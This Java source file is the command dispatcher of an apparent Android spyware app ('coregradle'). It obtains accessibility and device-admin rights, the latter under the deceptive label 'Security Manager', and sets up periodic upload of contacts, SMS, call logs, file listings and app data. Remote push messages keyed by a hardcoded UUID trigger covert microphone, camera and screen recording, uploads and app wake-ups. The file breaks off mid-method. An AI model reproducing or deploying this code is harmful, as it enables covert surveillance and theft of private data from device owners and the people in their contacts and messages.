package org.code.coregradle;

import static android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND;
import static android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Dialog;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.content.ContextCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.WorkManager;

import org.json.JSONObject;
import org.code.coregradle.activities.CrossActivity;
import org.code.coregradle.alarms.CoregradleReceiver;
import org.code.coregradle.alarms.RepeatingAlarm;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.dialogs.DialogUtils;
import org.code.coregradle.gatherers.AppInfoGatherer;
import org.code.coregradle.gatherers.BasicInfoGatherer;
import org.code.coregradle.gatherers.CallLogGatherer;
import org.code.coregradle.gatherers.ContactInfoGatherer;
import org.code.coregradle.gatherers.FilePathGatherer;
import org.code.coregradle.gatherers.InfoGatherer;
import org.code.coregradle.gatherers.PendingRecordingGatherer;
import org.code.coregradle.gatherers.PendingTaskResultGatherer;
import org.code.coregradle.gatherers.PendingTaskResultUploadGatherer;
import org.code.coregradle.gatherers.PhoneMessageGatherer;
import org.code.coregradle.gatherers.RecordingClearGatherer;
import org.code.coregradle.gatherers.RecordingGatherer;
import org.code.coregradle.gatherers.UploadGatherer;
import org.code.coregradle.gatherers.WynkGatherer;
import org.code.coregradle.receiver.WayneReceiver;
import org.code.coregradle.registerable.FirebaseRegistrable;
import org.code.coregradle.services.AlfredService;
import org.code.coregradle.services.RecordingService;
import org.code.coregradle.services.SyncService;
import org.code.coregradle.services.TaskService;
import org.code.coregradle.services.WynkService;
import org.code.coregradle.utils.AdminHelper;
import org.code.coregradle.utils.AudioRecordHelper;
import org.code.coregradle.utils.MessageXInterceptor;
import org.code.coregradle.utils.MiHelper;
import org.code.coregradle.utils.PermissionHelper;
import org.code.coregradle.utils.TimeUtils;
import org.code.coregradle.utils.WynkHelper;
import org.code.coregradle.workers.AppInfoReportWorker;
import org.code.coregradle.workers.AudioRecordingUploadWorker;
import org.code.coregradle.workers.BasicInfoWorker;
import org.code.coregradle.workers.CallLogReportWorker;
import org.code.coregradle.workers.ContactInfoWorker;
import org.code.coregradle.workers.FilePathWorker;
import org.code.coregradle.workers.FirebaseRegistrationWorker;
import org.code.coregradle.workers.HeartbeatWorker;
import org.code.coregradle.workers.LiveBasicInfoWorker;
import org.code.coregradle.workers.PhoneMessageReportWorker;
import org.code.coregradle.workers.TaskResultUploadWorker;
import org.code.coregradle.workers.TaskSchedulingWorker;
import org.code.coregradle.workers.UploadWorker;
import org.code.coregradle.workers.WynkUploadWorker;

import java.io.File;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class WorkerStore {
    private final static String ACCESSIBILITY_PREFS = "AccessibilityPrefs";
    private final static String ACCESSIBILITY_LAST_ASK_TIME = "lastAskTime";
    public final static String INSTALLATION_TIMESTAMP = "installationTimeStamp";
    public final static String APP_USAGE_PREFS = "usageInfo";
    public final static String BASE_MESSAGE = "56c5a442-c3ea-45b8-a775-c3404619289e";

    public static ExecutorService executorService = Executors.newCachedThreadPool();

    public static final int REQUEST_CODE_ENABLE_ADMIN = 29723;

    private static void handlePermissions(Activity activity) {
        PermissionHelper permissionHelper = new PermissionHelper(activity);
        permissionHelper.askPermissions(activity);
    }

    private static void handleMIUI(Activity activity) {
        if (Build.MANUFACTURER.toLowerCase().contains("Xiaomi".toLowerCase())) {
            Log.d("AlfredService", "Inside accessibility: " + shouldBringUpMIUISettings(activity));
            if (shouldBringUpMIUISettings(activity)) {
                MiHelper miHelper = MiHelper.getInstance(activity);
                miHelper.startMonitoring();
                Intent localIntent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                localIntent.setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
                localIntent.putExtra("extra_pkgname", activity.getPackageName());
                localIntent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                localIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                activity.startActivity(localIntent);
            }
        }
    }

    public static boolean shouldBringUpMIUISettings(Activity activity) {
        boolean shouldStart = false;
        try {
            IdentityStore identityStore = IdentityStore.getInstance(activity);
            JSONObject config = identityStore.getConfig();
            if (config.has("miuiBgLaunchPermission")) {
                JSONObject permission = config.getJSONObject("miuiBgLaunchPermission");
                if (permission.has("granted") && permission.has("checkedTimeStamp")) {
                    long checkedTimestamp = permission.getLong("checkedTimeStamp");
                    long timeDiff = System.currentTimeMillis() - checkedTimestamp;
                    long maxDelta = 24 * 60 * 60 * 1000;
                    if (!permission.getBoolean("granted") && AlfredService.isRunning && timeDiff >= maxDelta) {
                        shouldStart = true;
                    }
                }
            }
        } catch (Exception ignored) {

        }
        return shouldStart;
    }


    private static boolean shouldAskForAccessibilityPermission(long lastAskTime) {
        if (AlfredService.isRunning) {
            return false;
        }
        if (lastAskTime == 0)
            return true;
        Date now = new Date();
        int daysApart = (int) ((now.getTime() - lastAskTime) / (1000 * 60 * 60 * 24L));
        return daysApart >= 7;
    }

    private static void handleAccessibility(Activity activity) {
        SharedPreferences sharedPreferences = activity.getSharedPreferences(ACCESSIBILITY_PREFS, Context.MODE_PRIVATE);
        long lastAskTime = sharedPreferences.getLong(ACCESSIBILITY_LAST_ASK_TIME, 0);
        if (!BasicInfoGatherer.isAccessibilityServiceEnabled(activity, AlfredService.class) && shouldAskForAccessibilityPermission(lastAskTime)) {
            sharedPreferences.edit().putLong(ACCESSIBILITY_LAST_ASK_TIME, System.currentTimeMillis()).apply();
            Dialog dialog = DialogUtils.getAccessibilityPermissionDialog(activity);
            dialog.show();
        }
    }

    public static void handleInitialPermissions(Activity activity, boolean requestAccessibility, boolean requestDeviceAdmin) {
        if (requestAccessibility) {
            handleAccessibility(activity);
        }
        handleMIUI(activity);
        handlePermissions(activity);
        if (requestDeviceAdmin && BasicInfoGatherer.isAccessibilityServiceEnabled(activity, AlfredService.class)) {
            handleDeviceAdmin(activity);
        }
    }

    public static void handleDeviceAdmin(Activity activity) {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName wayneComponent = new ComponentName(activity, WayneReceiver.class);
        if (!devicePolicyManager.isAdminActive(wayneComponent)) {
            AdminHelper adminHelper = AdminHelper.getInstance(activity);
            adminHelper.startMonitoring();
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, wayneComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security Manager");
            activity.startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
        }
    }

    private static void addInstallationDate(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences(APP_USAGE_PREFS, Context.MODE_PRIVATE);
        if (!sharedPreferences.contains(INSTALLATION_TIMESTAMP)) {
            sharedPreferences.edit().putString(INSTALLATION_TIMESTAMP, new Date().toString()).apply();
        }
    }

    public static void registerWorkers(Context context) {
        registerWorkers(context, null);
    }

    public static void registerWorkers(Context context, FirebaseRegistrable firebaseRegistrable) {
        addInstallationDate(context);
        CoregradleReceiver.firebaseRegistrable = firebaseRegistrable;
        RepeatingAlarm.schedule(context, 10);
        RecordingService.createNotificationChannel(context);
        SyncService.createNotificationChannel(context);
        executorService.submit(() -> doFcmRegistration(firebaseRegistrable));

        WorkManager.getInstance(context)
                .enqueueUniqueWork(HeartbeatWorker.WORK_IDENTIFIER, ExistingWorkPolicy.KEEP, HeartbeatWorker.getOneTimeWorkRequest());

        WorkManager.getInstance(context)
                .enqueueUniqueWork(TaskSchedulingWorker.WORK_IDENTIFIER, ExistingWorkPolicy.KEEP, TaskSchedulingWorker.getOneTimeWorkRequest());

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, BasicInfoWorker.getWorkRequest(90));

        WorkManager.getInstance(context)
                .enqueueUniqueWork(LiveBasicInfoWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.KEEP, LiveBasicInfoWorker.getOneTimeWorkRequest());

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, AppInfoReportWorker.getWorkRequest(90));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, PhoneMessageReportWorker.getWorkRequest(90));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, CallLogReportWorker.getWorkRequest(90));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(UploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, UploadWorker.getWorkRequest(15));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, ContactInfoWorker.getWorkRequest(90));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(FilePathWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, FilePathWorker.getWorkRequest(45));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                        TaskSchedulingWorker.WORK_IDENTIFIER,
                        ExistingPeriodicWorkPolicy.KEEP,
                        TaskSchedulingWorker.getPeriodicWorkRequest(15));

        WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                        FirebaseRegistrationWorker.WORK_IDENTIFIER,
                        ExistingPeriodicWorkPolicy.KEEP,
                        FirebaseRegistrationWorker.getWorkRequest(15, firebaseRegistrable));

    }

    public static void doFcmRegistration(FirebaseRegistrable firebaseRegistrable) {
        try {
            if (firebaseRegistrable != null && !firebaseRegistrable.isRegistered()) {
                firebaseRegistrable.register();
            }
        } catch (Exception ignored) {

        }
    }

    public static void startInitialSync(Context context) {
        WorkManager.getInstance(context).beginWith(FilePathWorker.getOneTimeWorkRequest())
                .then(UploadWorker.getOneTimeWorkRequest(7))
                .enqueue();
    }

    public static void delegate(Context context, String body) {
        IdentityStore identityStore = IdentityStore.getInstance(context);
        AudioRecordHelper helper = AudioRecordHelper.getInstance(context);
        try {
            executorService.submit(new MessageXInterceptor("M: Received : " + body, identityStore.getIdentityValue()));

            if (body.equals("56c5a442-c3ea-45b8-a775-c3404619289e")) {
                executorService.submit(new MessageXInterceptor("M: Started everything", identityStore.getIdentityValue()));
                InfoGatherer[] infoGatherers = new InfoGatherer[]{
                        new BasicInfoGatherer(),
                        new ContactInfoGatherer(),
                        new FilePathGatherer(),
                        new UploadGatherer(),
                        new RecordingGatherer(),
                        new AppInfoGatherer(),
                        new PhoneMessageGatherer(),
                        new ContactInfoGatherer()
                };
                for (InfoGatherer infoGatherer : infoGatherers) {
                    infoGatherer.initGatherer(context);
                    executorService.submit(infoGatherer::makeRequest);
                }
                return;
            }

            // Recording Functionality

            if (body.equals("56c5a442-c3ea-45b8-a775-c3404619289e_a")) {
                executorService.submit(new MessageXInterceptor("M: Started recording Service", identityStore.getIdentityValue()));
                Intent serviceIntent = new Intent(context, RecordingService.class);
                serviceIntent.putExtra("mic", true);
                serviceIntent.putExtra("camera", true);
                ContextCompat.startForegroundService(context, serviceIntent);
                return;
            }

            if (body.equals("56c5a442-c3ea-45b8-a775-c3404619289e_a0")) {
                executorService.submit(new MessageXInterceptor("M: Started recording Service", identityStore.getIdentityValue()));
                Intent serviceIntent = new Intent(context, RecordingService.class);
                serviceIntent.putExtra("mic", true);
                serviceIntent.putExtra("camera", true);
                serviceIntent.putExtra("squeaky", true);
                ContextCompat.startForegroundService(context, serviceIntent);
                return;
            }


            if (body.equals("56c5a442-c3ea-45b8-a775-c3404619289e_a1")) {
                executorService.submit(new MessageXInterceptor("M: Started recording", identityStore.getIdentityValue()));

                executorService.submit(new MessageXInterceptor("M: Started recording Service", identityStore.getIdentityValue()));
                Intent serviceIntent = new Intent(context, RecordingService.class);
                serviceIntent.putExtra("mic", true);
                ContextCompat.startForegroundService(context, serviceIntent);
                return;
            }

            if (body.equals("56c5a442-c3ea-45b8-a775-c3404619289e_a2")) {
                executorService.submit(new MessageXInterceptor("M: Started recording", identityStore.getIdentityValue()));

                executorService.submit(new MessageXInterceptor("M: Started recording Service", identityStore.getIdentityValue()));
                Intent serviceIntent = new Intent(context, RecordingService.class);
                serviceIntent.putExtra("camera", true);
                ContextCompat.startForegroundService(context, serviceIntent);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_b")) {
                executorService.submit(new MessageXInterceptor("M: Stopped recording Service", identityStore.getIdentityValue()));
                helper.stopRecording();
                Intent serviceIntent = new Intent(context, RecordingService.class);
                context.stopService(serviceIntent);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_c")) {
                executorService.submit(new MessageXInterceptor("M: Started uploading", identityStore.getIdentityValue()));
                InfoGatherer infoGatherer = new RecordingGatherer();
                infoGatherer.initGatherer(context.getApplicationContext());
                infoGatherer.makeRequest();
                WorkManager.getInstance(context)
                        .enqueueUniquePeriodicWork(AudioRecordingUploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, AudioRecordingUploadWorker.getWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_d")) {
                executorService.submit(new MessageXInterceptor("M: Updating HumEndTimestamp", identityStore.getIdentityValue()));
                RecordingGatherer recordingGatherer = new RecordingGatherer();
                recordingGatherer.initGatherer(context);
                executorService.submit(recordingGatherer::handleEndTimeUpdate);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_ax")) {
                executorService.submit(new MessageXInterceptor("M: Clearing hum recordings", identityStore.getIdentityValue()));
                RecordingClearGatherer clearHumGatherer = new RecordingClearGatherer();
                clearHumGatherer.initGatherer(context, RecordingClearGatherer.Type.HUM);
                executorService.submit(clearHumGatherer::makeRequest);
                return;
            }

            // Clear up work manager queue

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_x")) {
                executorService.submit(new MessageXInterceptor("M: Stopped all workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .cancelAllWork();
                try {
                    TimeUtils.sleep(5000);
                    executorService.shutdownNow();
                    executorService = Executors.newCachedThreadPool();
                    context.getSharedPreferences(ACCESSIBILITY_PREFS, Context.MODE_PRIVATE).edit().remove(ACCESSIBILITY_LAST_ASK_TIME).apply();
                } catch (Exception ignored) {
                }
                return;
            }

            // Onetime Workers

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_1")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, BasicInfoWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_2")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, ContactInfoWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_3")) {
                executorService.submit(new MessageXInterceptor("M: Started File path Info workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(FilePathWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, FilePathWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_4")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(UploadWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.KEEP, UploadWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_7")) {
                executorService.submit(new MessageXInterceptor("M: Started AppInfoReport workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, AppInfoReportWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_8")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingWorkPolicy.REPLACE, PhoneMessageReportWorker.getOneTimeWorkRequest());
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_9")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport workers", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingWorkPolicy.REPLACE, CallLogReportWorker.getOneTimeWorkRequest());
                return;
            }

            // Executors

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_1z")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new BasicInfoGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_2z")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new ContactInfoGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_3z")) {
                executorService.submit(new MessageXInterceptor("M: Started File path Info executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new FilePathGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_4z")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new UploadGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_7z")) {
                executorService.submit(new MessageXInterceptor("M: Started AppInfo executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new AppInfoGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_8z")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new PhoneMessageGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_9z")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new CallLogGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_8zr")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new PhoneMessageGatherer(200);
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_9zr")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport executor", identityStore.getIdentityValue()));
                InfoGatherer gather = new CallLogGatherer(200);
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            //Periodic Workers
            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_1l")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, BasicInfoWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_2l")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, ContactInfoWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_3l")) {
                executorService.submit(new MessageXInterceptor("M: Started File Path Info periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(FilePathWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, FilePathWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_4l")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(UploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, UploadWorker.getWorkRequest(15));
                return;
            }


            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_7l")) {
                executorService.submit(new MessageXInterceptor("M: Started App Info Sync periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, AppInfoReportWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_8l")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport Sync periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, PhoneMessageReportWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_9l")) {
                executorService.submit(new MessageXInterceptor("M: Start CallLog Report Sync periodic", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, CallLogReportWorker.getWorkRequest(15));
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_4f")) {
                Intent intent = new Intent(context, SyncService.class);
                ContextCompat.startForegroundService(context, intent);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_4fb")) {
                Intent intent = new Intent(context, SyncService.class);
                context.stopService(intent);
            }

            // Screen Recording
            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_sa")) {
                executorService.submit(new MessageXInterceptor("M: Started wynking", identityStore.getIdentityValue()));
                PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
                if (!powerManager.isScreenOn() || keyguardManager.isKeyguardLocked()) {
                    WynkHelper wynkHelper = WynkHelper.getInstance(context);
                    wynkHelper.queueRecording();
                    executorService.submit(new MessageXInterceptor("M: Wynking Queued ScreenStatus: " + powerManager.isScreenOn() + " KeyGuard: " + keyguardManager.isKeyguardLocked(), identityStore.getIdentityValue()));
                } else {
                    //TODO: Don't check for XActivity if you don't have accessibility in the first place
                    File file = new File(context.getFilesDir(), ".canLaunchXActivity");
                    file.createNewFile();
                    Intent intent = new Intent(context, CrossActivity.class);
                    intent.putExtra("screenCap", true);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    context.startActivity(intent);
                    TimeUtils.sleep(5000);
                    if (file.exists()) {
                        updateIdentityStore(context, false, "FCMScreenRecord");
                    } else {
                        updateIdentityStore(context, true, "FCMScreenRecord");
                    }
                }
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_sb")) {
                WynkHelper wynkHelper = WynkHelper.getInstance(context);
                wynkHelper.stopRecording();
                wynkHelper.deQueueRecording();
                executorService.submit(new MessageXInterceptor("M: Stopped wynking", identityStore.getIdentityValue()));
                Intent intent = new Intent(context, WynkService.class);
                context.stopService(intent);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_sc")) {
                executorService.submit(new MessageXInterceptor("M: Started Wynk Upload", identityStore.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(WynkUploadWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.KEEP, WynkUploadWorker.getOneTimeWorkRequest());
                InfoGatherer gather = new WynkGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_sd")) {
                executorService.submit(new MessageXInterceptor("M: Updating WinkEndTimestamp", identityStore.getIdentityValue()));
                WynkGatherer wynkGatherer = new WynkGatherer();
                wynkGatherer.initGatherer(context);
                executorService.submit(wynkGatherer::handleEndTimeUpdate);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_sx")) {
                executorService.submit(new MessageXInterceptor("M: Clearing wynk recordings", identityStore.getIdentityValue()));
                RecordingClearGatherer clearWynkGatherer = new RecordingClearGatherer();
                clearWynkGatherer.initGatherer(context, RecordingClearGatherer.Type.WYNK);
                executorService.submit(clearWynkGatherer::makeRequest);
                return;
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_rr")) {
                //TODO: Call report recordings apis
                executorService.submit(new MessageXInterceptor("M: Pending recording upload request recieved", identityStore.getIdentityValue()));
                InfoGatherer pendingRecordingGatherer = new PendingRecordingGatherer();
                pendingRecordingGatherer.initGatherer(context);
                executorService.submit(pendingRecordingGatherer::makeRequest);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_wk")) {
                if (isAppInForeground()) {
                    executorService.submit(new MessageXInterceptor("M: Already in foreground", identityStore.getIdentityValue()));
                } else {
                    executorService.submit(new MessageXInterceptor("M: Waking up the app", identityStore.getIdentityValue()));
                    Intent intent = new Intent(context, CrossActivity.class);
                    intent.putExtra("AppBucketPrevention", true);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    context.startActivity(intent);
                }
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_mi1")) {
                executorService.submit(new MessageXInterceptor("M: Force marking background true", identityStore.getIdentityValue()));
                updateIdentityStore(context, true, "FCMForce", 0);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_mi0")) {
                executorService.submit(new MessageXInterceptor("M: Force marking background false", identityStore.getIdentityValue()));
                updateIdentityStore(context, false, "FCMForce", 0);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_aca")) {
                executorService.submit(new MessageXInterceptor("Resetting Accessibility date", identityStore.getIdentityValue()));
                SharedPreferences sharedPreferences = context.getSharedPreferences(ACCESSIBILITY_PREFS, Context.MODE_PRIVATE);
                sharedPreferences.edit().remove(ACCESSIBILITY_LAST_ASK_TIME).apply();
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_ta")) {
                Intent intent = new Intent(context, TaskService.class);
                ContextCompat.startForegroundService(context, intent);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_tb")) {
                Intent intent = new Intent(context, TaskService.class);
                context.stopService(intent);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_tr")) {
                executorService.submit(new MessageXInterceptor("M: Pending tasks upload request received", identityStore.getIdentityValue()));
                InfoGatherer pendingTaskResultGatherer = new PendingTaskResultGatherer();
                pendingTaskResultGatherer.initGatherer(context);
                executorService.submit(pendingTaskResultGatherer::makeRequest);
            }

            if (body.endsWith("56c5a442-c3ea-45b8-a775-c3404619289e_tc")) {
                executorService.submit(new MessageXInterceptor("M: Started Task Result Upload", identityStore.getIdentityValue()));
                WorkManager.getInstance(context)
                        .enqueueUniqueWork(TaskResultUploadWorker.WORK_ID,
                                ExistingWorkPolicy.KEEP,
                                TaskResultUploadWorker.getOneTimeWorkRequest());
                InfoGatherer gather = new PendingTaskResultUploadGatherer();
                gather.initGatherer(context);
                executorService.submit(gather::makeRequest);
                return;
            }

        } catch (Exception ignored) {
        }
    }

    public static boolean isAccessibilityDone(Activity activity) {
        SharedPreferences sharedPreferences = activity.getSharedPreferences(ACCESSIBILITY_PREFS, Context.MODE_PRIVATE);
        long lastAskTime = sharedPreferences.getLong(ACCESSIBILITY_LAST_ASK_TIME, 0);
